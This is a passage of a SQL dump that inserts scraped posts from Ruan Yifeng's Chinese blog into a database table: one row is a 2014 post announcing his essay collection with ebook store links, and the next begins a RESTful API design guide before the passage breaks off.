INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(21, 'http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html', '我的博客文集上架了！', '<p>这个博客写了十年，累积了1000多篇文章。</p>\n\n        <p>我一直想整理一本文集，这个月终于完成了。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014052902.jpg"><img alt="封面" src="http://image.beekka.com/blog/2014/bg2014052901.jpg" title="" /></a></p>\n\n<p>书名叫做<strong>《如何变得有思想？》</strong>，电子版已经上架了，下面是链接。</p>\n\n<blockquote>\n  <p>（1）<a href="http://yuedu.baidu.com/ebook/3509a1d7daef5ef7bb0d3c3a">百度</a>（上下册合集）</p>\n\n<p>（2）网易：<a href="http://yuedu.163.com/source/aefcf8ba2e12426983da45d6e875b3bf_4">上册</a>，<a href="http://yuedu.163.com/source/1d1aab05444c4187ad5feb54c0cb5af7_4">下册</a></p>\n\n<p>（3）多看：<a href="http://www.duokan.com/book/48508">上册</a>，<a href="http://www.duokan.com/book/48501">下册</a></p>\n\n<p>（4）豆瓣：<a href="https://read.douban.com/ebook/3966114/">上册</a>，<a href="https://read.douban.com/ebook/3970171/">下册</a></p>\n\n<p>（5）图灵：<a href="http://www.ituring.com.cn/book/1391">上册</a>，<a href="http://www.ituring.com.cn/book/1432">下册</a>（提供EPUB、MOBI、PDF格式下载）</p>\n\n<p>（6）SelfStore：<a href="https://selfstore.io/products/97">上册</a>，<a href="https://selfstore.io/products/99">下册</a>（提供EPUB、MOBI、PDF格式下载）</p>\n</blockquote>\n\n<p><strong>十年（2004-2013）的思想漫游，100篇精华文章，20万字，只售15元！</strong></p>\n\n<p>如果你喜欢我的博客，我建议购买一本。当然，不买也没关系，免费阅读<a href="http://www.ruanyifeng.com/blog/essays/">点击这里</a>。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-05-29T19:44:01+08:00">2014年5月29日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/opinions/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 观点与感想</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-19 00:18:28', '2014-05-29 11:44:01', 0, '[["\\u4e0b\\u518c", 0.43906811546923075], ["\\u4e0a\\u518c", 0.4331392431692308], ["EPUB", 0.18391950004461538], ["MOBI", 0.18391950004461538], ["PDF", 0.18391950004461538], ["\\u683c\\u5f0f", 0.12992856210184617], ["\\u535a\\u5ba2", 0.12960329384676925], ["\\u6587\\u96c6", 0.12171871130907692], ["\\u4e00\\u672c", 0.11647625763769232], ["\\u8bb0\\u5fc6", 0.11478965047507693], ["\\u4e0b\\u8f7d", 0.10997549655123078], ["\\u6587\\u7ae0", 0.1018989219283077], ["\\u4e0a\\u4e0b\\u518c", 0.10159638824153847], ["\\u5341\\u5e74", 0.09848083632892309], ["\\u751f\\u547d", 0.09438628570584616], ["\\u7535\\u5b50\\u7248", 0.09314552448230769], ["\\u53ea\\u552e", 0.09195975002230769], ["20", 0.09195975002230769], ["29", 0.09195975002230769], ["2014", 0.09195975002230769]]', NULL, NULL, '这个博客写了十年，累积了1000多篇文章。 我一直想整理一本文集，这个月终于完成了。 书名叫做《如何变得有思想？》，电子版已经上架了，下面是链接。 （1）百度（上下册合集） （2）网易：上册，下册 （3）多看：上册，下册 （4）豆瓣：上册，下册 （5）图灵：上册，下册（提供EPUB、MOBI、PDF格式下载） （6）SelfStore：上册，下册（提供EPUB、MOBI、PDF格式下载） 十年（2004-2013）的思想漫游，100篇精华文章，20万字，只售15元！ 如果你喜欢我的博客，我建议购买一本。当然，不买也没关系，免费阅读点击这里。 （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年5月29日 更多内容： 档案 » 观点与感想 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL),
(22, 'http://www.ruanyifeng.com/blog/2014/05/restful_api.html', 'RESTful API 设计指南', '<p>网络应用程序，分为前端和后端两个部分。当前的发展趋势，就是前端设备层出不穷（手机、平板、桌面电脑、其他专用设备......）。</p>\n\n        <p>因此，必须有一种统一的机制，方便不同的前端设备与后端进行通信。这导致API构架的流行，甚至出现<a href="http://www.google.com.hk/search?q=API+first">"API First"</a>的设计思想。<a href="http://en.wikipedia.org/wiki/Representational_state_transfer">RESTful API</a>是目前比较成熟的一套互联网应用程序的API设计理论。我以前写过一篇<a href="http://www.ruanyifeng.com/blog/2011/09/restful.html">《理解RESTful架构》</a>，探讨如何理解这个概念。</p>\n\n<p>今天，我将介绍RESTful API的设计细节，探讨如何设计一套合理、好用的API。我的主要参考了两篇文章（<a href="http://codeplanet.io/principles-good-restful-api-design/">1</a>，<a href="https://bourgeois.me/rest/">2</a>）。</p>\n\n<p><img alt="RESTful API" src="http://image.beekka.com/blog/2014/bg2014052201.png" title="" /></p>\n\n<h2>一、协议</h2>\n\n<p>API与用户的通信协议，总是使用<a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">HTTPs协议</a>。</p>\n\n<h2>二、域名</h2>\n\n<p>应该尽量将API部署在专用域名之下。</p>\n\n<blockquote><pre><code class="language-javascript">\nhttps://api.example.com\n</code></pre></blockquote>\n\n<p>如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。</p>\n\n<blockquote><pre><code class="language-javascript">\nhttps://example.org/api/\n</code></pre></blockquote>\n\n<h2>三、版本（Versioning）</h2>\n\n<p>应该将API的版本号放入URL。</p>\n\n<blockquote><pre><code class="language-javascript">\nhttps://api.example.com/v1/\n</code></pre></blockquote>\n\n<p>另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。<a 